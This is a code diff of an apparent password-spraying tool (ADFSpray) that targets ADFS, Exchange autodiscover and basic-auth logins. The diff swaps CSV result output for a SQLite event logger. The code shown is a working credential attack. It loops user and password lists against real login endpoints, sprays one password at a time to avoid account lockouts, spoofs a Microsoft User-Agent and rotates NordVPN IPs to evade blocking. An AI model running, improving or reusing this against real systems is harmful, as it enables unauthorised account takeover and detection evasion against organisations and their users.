@@ -3,16 +3,15 @@
 # by @xFreed0m
 
 import argparse
-import csv
 import datetime
 import sys
 import time
 import urllib
 import urllib.parse
+import requests
 from random import randint
 from nordvpn_switcher import initialize_VPN,terminate_VPN
-from utils import configure_logger, safe_rotate_vpn, get_public_ip
-import requests
+from utils import configure_logger, safe_rotate_vpn, get_public_ip, excptn, init_db, log_event
 from requests.packages.urllib3.exceptions import InsecureRequestWarning, TimeoutError
 from requests_ntlm import HttpNtlmAuth
 
@@ -52,20 +51,14 @@ def args_parse():
         'minimum_sleep', 'maximum_sleep'), help="Randomize the time between each authentication "
                                                 "attempt. Please provide minimum and maximum "
                                                 "values in seconds")
-    parser.add_argument('-o', '--output', help="Output each attempt result to a csv file",
-                        default="ADFSpray")
     parser.add_argument('method', choices=['adfs', 'autodiscover', 'basicauth'])
 
-    parser.add_argument('-V', '--verbose', help="Turn on verbosity to show failed "
+    parser.add_argument('-v', '--verbose', help="Turn on verbosity to show failed "
                                                 "attempts", action="store_true", default=False)
     
     parser.add_argument("--vpn", action=argparse.BooleanOptionalAction, help="Use nord vpn to rotate IP")
     return parser.parse_args()
 
-
-def excptn(e):
-    LOGGER.critical("[!]Exception: " + str(e))
-    exit(1)
 
 
 def userlist(incoming_userlist):  # Creating an array out of the users file
@@ -85,27 +78,18 @@ def targetlist(incoming_targetlist):  # Creating an array out of the targets fil
         return [p.strip() for p in target_obj.readlines()]
 
 
-def output(status, username, password, target, output_file_name):
-    #  creating a CSV file to log the attempts
-    try:
-        with open(output_file_name + ".csv", mode='a') as log_file:
-            creds_writer = csv.writer(log_file, delimiter=',', quotechar='"')
-            creds_writer.writerow([status, username, password, target])
-    except Exception as output_err:
-        excptn(output_err)
-
 
 def random_time(minimum, maximum):
     sleep_amount = randint(minimum, maximum)
     return sleep_amount
 
 
-def basicauth_attempts(users, passes, targets, output_file_name, sleep_time, random, min_sleep, max_sleep, verbose):
+def basicauth_attempts(users, passes, targets, sleep_time, random, min_sleep, max_sleep, verbose):
     working_creds_counter = 0  # zeroing the counter of working creds before starting to count
     
+    ip = get_public_ip(timeout=5, retries=2)
     try:
         LOGGER.info("[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
-        output('Status', 'Username', 'Password', 'Target', output_file_name)  # creating the 1st line in the output file
         for target in targets:  # checking each target separately
             for password in passes:  # trying one password against each user, less likely to lockout users
                 for username in users:
@@ -114,14 +98,11 @@ def basicauth_attempts(users, passes, targets, output_file_name, sleep_time, ran
                     response = session.get(target)
                     #  Currently checking only if working or not, need to add more tests in the future
                     if response.status_code == 200:
-                        status = 'SUCCESS'
-                        output(status, username, password, target, output_file_name)
+                        log_event(subject=username, target=target, status="success", ip=ip, details="")
                         working_creds_counter += 1
                         LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
                     else:
-                        status = 'FAIL'
-                        if verbose:
-                            output(status, username, password, target, output_file_name)
+                        log_event(subject=username, target=target, status="fail", ip=ip, details="")
                         LOGGER.debug("[-]Creds failed for: %s" % username)
                     if random is True:  # let's wait between attempts
                         sleep_time = random_time(min_sleep, max_sleep)
@@ -144,12 +125,12 @@ def basicauth_attempts(users, passes, targets, output_file_name, sleep_time, ran
         excptn(e)
 
 
-def autodiscover_attempts(users, passes, targets, output_file_name, sleep_time, random, min_sleep, max_sleep, verbose):
+def autodiscover_attempts(users, passes, targets, sleep_time, random, min_sleep, max_sleep, verbose):
     working_creds_counter = 0  # zeroing the counter of working creds before starting to count
 
+    ip = get_public_ip(timeout=5, retries=2)
     try:
         LOGGER.info("[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
-        output('Status', 'Username', 'Password', 'Target', output_file_name)  # creating the 1st line in the output file
         for target in targets:  # checking each target separately
             for password in passes:  # trying one password against each user, less likely to lockout users
                 for username in users:
@@ -158,14 +139,11 @@ def autodiscover_attempts(users, passes, targets, output_file_name, sleep_time, 
                                        headers={'User-Agent': 'Microsoft'}, verify=False)
                     #  Currently checking only if working or not, need to add more tests in the future
                     if req.status_code == 200:
-                        status = 'SUCCESS'
-                        output(status, username, password, target, output_file_name)
+                        log_event(subject=username, target=target, status="success",  ip=ip, details="")
                         working_creds_counter += 1
                         LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
                     else:
-                        status = 'FAIL'
-                        if verbose:
-                            output(status, username, password, target, output_file_name)
+                        log_event(subject=username, target=target, status="fail", ip=ip, details="")
                         LOGGER.debug("[-]Creds failed for: %s" % username)
                     if random is True:  # let's wait between attempts
                         sleep_time = random_time(min_sleep, max_sleep)
@@ -188,15 +166,13 @@ def autodiscover_attempts(users, passes, targets, output_file_name, sleep_time, 
         excptn(e)
 
 
-def adfs_attempts(users, passes, targets, output_file_name, sleep_time, random, min_sleep, max_sleep, verbose, vpn, initial_ip=None):
+def adfs_attempts(users, passes, targets, sleep_time, random, min_sleep, max_sleep, verbose, vpn, initial_ip=None):
     working_creds_counter = 0  # zeroing the counter of working creds before starting to count
     username_counter = 0
     prev_ip = initial_ip
 
     try:
         LOGGER.info("[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
-        output('Status', 'Username', 'Password', 'Target', output_file_name)  # creating the 1st line in the output file
-
         for target in targets:  # checking each target separately
             for password in passes:  # trying one password against each user, less likely to lockout users
                 for username in users:
@@ -208,6 +184,8 @@ def adfs_attempts(users, passes, targets, output_file_name, sleep_time, random, 
                         else:
                             LOGGER.warning("[VPN] Rotation failed — exiting")
                             sys.exit(1)
+
+                    ip = get_public_ip(timeout=5, retries=2)
 
                     target_url = "%s/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn%%3afederation" \
                                  "%%3aMicrosoftOnline&wctx=cbcxt=&username=%s&mkt=&lc=" % (target, username)
@@ -225,14 +203,11 @@ def adfs_attempts(users, passes, targets, output_file_name, sleep_time, random, 
                     #  Currently checking only if working or not, need to add more tests in the future
 
                     if status_code == 302:
-                        status = 'SUCCESS'
-                        output(status, username, password, target, output_file_name)
+                        log_event(subject=username, target=target, status="success", ip=ip, details="")
                         working_creds_counter += 1
                         LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
                     else:
-                        status = 'FAIL'
-                        if verbose:
-                            output(status, username, password, target, output_file_name)
+                        log_event(subject=username, target=target, status="fail", ip=ip, details="")
                         LOGGER.debug("[-]Creds failed for: %s" % username)
                     if random is True:  # let's wait between attempts
                         sleep_time = random_time(min_sleep, max_sleep)
@@ -263,7 +238,8 @@ def main():
     min_sleep, max_sleep = 0, 0
     usernames_stripped, passwords_stripped, targets_stripped = [], [], []
     global LOGGER
-    LOGGER = configure_logger(args.verbose)
+    LOGGER = configure_logger(args.verbose, "ADFS")
+    init_db("events.db")
     vpn = args.vpn
 
     if args.userlist:
@@ -331,17 +307,17 @@ def main():
 
     if args.method == 'autodiscover':
         LOGGER.info("[*] You chose %s method" % args.method)
-        autodiscover_attempts(usernames_stripped, passwords_stripped, targets_stripped, args.output,
+        autodiscover_attempts(usernames_stripped, passwords_stripped, targets_stripped,
                               args.sleep, random, min_sleep, max_sleep, args.verbose)
 
     elif args.method == 'adfs':
         LOGGER.info("[*] You chose %s method" % args.method)
-        adfs_attempts(usernames_stripped, passwords_stripped, targets_stripped, args.output,
+        adfs_attempts(usernames_stripped, passwords_stripped, targets_stripped,
                       args.sleep, random, min_sleep, max_sleep, args.verbose, vpn, initial_ip=initial_ip)
 
     elif args.method == 'basicauth':
         LOGGER.info("[*] You chose %s method" % args.method)
-        basicauth_attempts(usernames_stripped, passwords_stripped, targets_stripped, args.output,
+        basicauth_attempts(usernames_stripped, passwords_stripped, targets_stripped,
                            args.sleep, random, min_sleep, max_sleep, args.verbose)
 
     else:
